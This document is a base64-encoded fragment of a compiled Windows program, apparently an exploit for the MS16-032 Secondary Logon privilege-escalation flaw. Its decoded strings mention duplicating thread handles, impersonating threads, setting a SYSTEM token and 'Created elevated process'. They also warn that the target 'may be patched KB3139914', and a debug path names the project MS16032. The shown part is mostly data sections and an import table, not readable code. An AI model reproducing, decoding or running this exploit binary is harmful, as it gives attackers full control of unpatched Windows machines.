AgECAQIBAgECAQIBAgECAQIBAgECAQIBAgEQABAAEAAQACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAABAQEBAQEBAQEBAQEBAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAAgECAQIBAgECAQIBAgECAQEBAAAAAAAAAAAAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+fwAxI1NOQU4AADEjSU5EAAAAMSNJTkYAAAAxI1FOQU4AAEEAAAAXAAAAQwBPAE4ATwBVAFQAJAAAAGdlbmVyaWMAdW5rbm93biBlcnJvcgAAAGlvc3RyZWFtAAAAAAAAAABpb3N0cmVhbSBzdHJlYW0gZXJyb3IAAABzeXN0ZW0AAGMAbQBkAC4AZQB4AGUAAAB0AGUAcwB0AAAAAAAAAAAARXJyb3IgZHVwbGljYXRpbmcgaGFuZGxlICVkIChUYXJnZXQgbWF5IGJlIHBhdGNoZWQgS0IzMTM5OTE0KQoAAEVycm9yOiAlZCAoVGFyZ2V0IG1heSBiZSBwYXRjaGVkIEtCMzEzOTkxNCkKAAAAAE50SW1wZXJzb25hdGVUaHJlYWQAAAAAAG4AdABkAGwAbAAAAAAAAAAAAAAAAAAAAEVycm9yIGltcGVyc29uYXRpbmcgdGhyZWFkICUwOFggKFRhcmdldCBtYXkgYmUgcGF0Y2hlZCBLQjMxMzk5MTQpCgAAAAAAAAAAAAAAAAAARXJyb3Igb3BlbmluZyB0aHJlYWQgdG9rZW46ICVkIChUYXJnZXQgbWF5IGJlIHBhdGNoZWQgS0IzMTM5OTE0KQoAAAAAAAAARXJyb3Igc2V0dGluZyB0b2tlbjogJWQgKFRhcmdldCBtYXkgYmUgcGF0Y2hlZCBLQjMxMzk5MTQpCgAAAAAAACUAcwAgAFsAYwBvAG0AbQBhAG4AZABdACAAWwBwAGEAcgBhAG0AZQB0AGUAcgBzAF0ADQAKAAAAR2F0aGVyaW5nIHRocmVhZCBoYW5kbGVzCgAAAAAAAABIYW5kbGUgbm90IGEgdGhyZWFkOiAlZAoAAAAAAAAAAERvbmUsIGdvdCAlZCBoYW5kbGVzCgAAAFN5c3RlbSBUb2tlbjogJXAKAAAAIAAAAFIAdQBuAG4AaQBuAGcAIAAnACUAcwAnACAALgAuAC4ADQAKAAAAAAAAAAAAAAAAAEMAbwB1AGwAZAAgAG4AbwB0ACAAYwByAGUAYQB0AGUAIABlAGwAZQB2AGEAdABlAGQAIABwAHIAbwBjAGUAcwBzACwAIAB0AGUAcgBtAGkAbgBhAHQAaQBuAGcAIABwAHIAbwBjAGUAcwBzACAALgAuAC4ADQAKAAAAAAAAAAAAQ3JlYXRlZCBlbGV2YXRlZCBwcm9jZXNzDQoAAAAAAABzdHJpbmcgdG9vIGxvbmcAaW52YWxpZCBzdHJpbmcgcG9zaXRpb24AbWFwL3NldDxUPiB0b28gbG9uZwAAAAAAIgWTGQIAAAB4swEAAQAAAPyzAQADAAAAJLQBADAAAAAAAAAAAQAAACIFkxkCAAAAeLMBAAEAAACIswEABQAAALCzAQAwAAAAAAAAAAEAAAAiBZMZBAAAAACxAQACAAAAnLIBAAgAAADssgEAIAAAAAAAAAABAAAAIgWTGQQAAAAAsQEAAgAAACCxAQAIAAAAcLEBACAAAAAAAAAAAQAAACIFkxkCAAAA6K8BAAAAAAAAAAAADQAAAPivAQC4AAAAAAAAAAEAAAAAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI0AFAAQAAAAAAAAAAAAAAAAAAAAAAAABSU0RToW8tvFsnvkeDVhCIc5MibwEAAABDOlxVc2Vyc1x0d2lsc29uXERvY3VtZW50c1xWaXN1YWwgU3R1ZGlvIDIwMTNcUHJvamVjdHNcTVMxNjAzMlx4NjRcUmVsZWFzZVxNUzE2MDMyLnBkYgAAAAAAAKMAAACjAAAAAAAAAAAAAAAAAAAACOgBAAAAAAAAAAAA/////wAAAABAAAAAwKkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAANipAQAAAAAAAAAAAJipAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAADg5wEAEKoBAOipAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAKKoBAAAAAAAAAAAAQKoBAJipAQAAAAAAAAAAAAAAAAAAAAAA4OcBAAEAAAAAAAAA/////wAAAABAAAAAEKoBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAADDoAQCQqgEAaKoBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACoqgEAAAAAAAAAAADAqgEAmKkBAAAAAAAAAAAAAAAAAAAAAAAw6AEAAQAAAAAAAAD/////AAAAAEAAAACQqgEAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAWOgBABCrAQDoqgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAACirAQAAAAAAAAAAAEirAQDAqgEAmKkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAWOgBAAIAAAAAAAAA/////wAAAABAAAAAEKsBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAIDoAQCYqwEAcKsBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACwqwEAAAAAAAAAAADQqwEAwKoBAJipAQAAAAAAAAAAAAAAAAAAAAAAAAAAAIDoAQACAAAAAAAAAP////8AAAAAQAAAAJirAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACo6AEAIKwBAPirAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAOKwBAAAAAAAAAAAASKwBAAAAAAAAAAAAAAAAAKjoAQAAAAAAAAAAAP////8AAAAAQAAAACCsAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAI6AEAwKkBAHCsAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAyOgBAMCsAQCYrAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAANisAQAAAAAAAAAAAPCsAQCYqQEAAAAAAAAAAAAAAAAAAAAAAMjoAQABAAAAAAAAAP////8AAAAAQAAAAMCsAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAABYrgEAAAAAAAAAAABg6QEAAAAAAAAAAAD/////AAAAAEAAAAAYrQEAAAAAAAAAAAAAAAAAAAAAAAAA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dGVyAP8ARGVjb2RlUG9pbnRlcgBXAUV4aXRQcm9jZXNzAGwCR2V0TW9kdWxlSGFuZGxlRXhXAADUA011bHRpQnl0ZVRvV2lkZUNoYXIA2wVXaWRlQ2hhclRvTXVsdGlCeXRlAM8BR2V0Q29tbWFuZExpbmVXALYEUnRsUGNUb0ZpbGVIZWFkZXIAQwRSYWlzZUV4Y2VwdGlvbgAAtARSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAC6BFJ0bFVud2luZEV4AGoDSXNEZWJ1Z2dlclByZXNlbnQAcANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50ACkBRW50ZXJDcml0aWNhbFNlY3Rpb24AAKUDTGVhdmVDcml0aWNhbFNlY3Rpb24AAEEDSGVhcFNpemUAADwDSGVhcEZyZWUAAAYBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAK0EUnRsQ2FwdHVyZUNvbnRleHQAuwRSdGxWaXJ0dWFsVW53aW5kAACQBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAUAVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAGAVTZXRMYXN0RXJyb3IAAFEDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudABfBVNsZWVwAIAFVGxzQWxsb2MAAIIFVGxzR2V0VmFsdWUAgwVUbHNTZXRWYWx1ZQCBBVRsc0ZyZWUAxQJHZXRTdGFydHVwSW5mb1cAxwJHZXRTdGRIYW5kbGUAAO8FV3JpdGVGaWxlAGkCR2V0TW9kdWxlRmlsZU5hbWVXAACqA0xvYWRMaWJyYXJ5RXhXAAB1A0lzVmFsaWRDb2RlUGFnZQCqAUdldEFDUAAAjQJHZXRPRU1DUAAAuQFHZXRDUEluZm8AOANIZWFwQWxsb2MAFAJHZXRDdXJyZW50VGhyZWFkSWQAAKkCR2V0UHJvY2Vzc0hlYXAAAEUCR2V0RmlsZVR5cGUAMARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAQAkdldEN1cnJlbnRQcm9jZXNzSWQA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQAuAkdldEVudmlyb25tZW50U3RyaW5nc1cAAKMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAPwNIZWFwUmVBbGxvYwCZA0xDTWFwU3RyaW5nVwAA/QNPdXRwdXREZWJ1Z1N0cmluZ1cAAMwCR2V0U3RyaW5nVHlwZVcAAJgBRmx1c2hGaWxlQnVmZmVycwAA4gFHZXRDb25zb2xlQ1AAAPQBR2V0Q29uc29sZU1vZGUAAAsFU2V0RmlsZVBvaW50ZXJFeAAALgVTZXRTdGRIYW5kbGUAAO4FV3JpdGVDb25zb2xlVwDCAENyZWF0ZUZpbGVXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdZgAAHOYAAAyot8tmSsAAM1dINJm1P//AQAAAAIAAAAg/wFAAQAAAAAAAAAAAAAAIP8BQAEAAAABAQAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA